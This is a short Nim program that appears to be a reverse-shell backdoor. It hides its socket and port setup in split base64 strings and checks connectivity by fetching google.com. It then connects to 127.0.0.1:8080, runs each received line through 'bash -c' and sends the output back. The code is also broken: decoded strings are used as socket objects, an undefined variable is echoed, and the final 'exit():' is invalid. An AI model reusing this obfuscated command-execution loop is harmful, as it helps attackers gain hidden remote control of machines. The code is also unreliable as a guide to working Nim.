import osproc
import net, httpclient
import nimcrypto, base64

const
  have1 = "bmV"
  have2 = "3U29j"
  have3 = "a2V"
  have4 = "0KCk="
  #encsock =  decode("UG9ydCg4MDgwKQ==")
  mhm2 = "UG9"
  mhm5 = "ydCg"
  mhm18 = "4MDg"
  mhm23 = "gwK"
  mhm37 = "Q=="


var
  Lip = "127.0.0.1"
  Lport = decode(mhm2 & mhm5 & mhm18 & mhm23 & mhm37) # b64 port and socket
  socket = decode(have1 & have2 & have3 & have4)
  client = newHttpClient()
  response: Response = nil

try:
  response = client.request("https://www.google.com", httpMethod = HttpGet)
  if response.status == "200":
    try:
      socket.connect(Lip, Lport)
      echo data
      while true:
        let cmd = socket.recvLine()
        if cmd == "exit":
          break
        let result = execProcess("bash -c " & cmd)
        socket.send(result)
    except:
      socket.close
  else:
    exit():

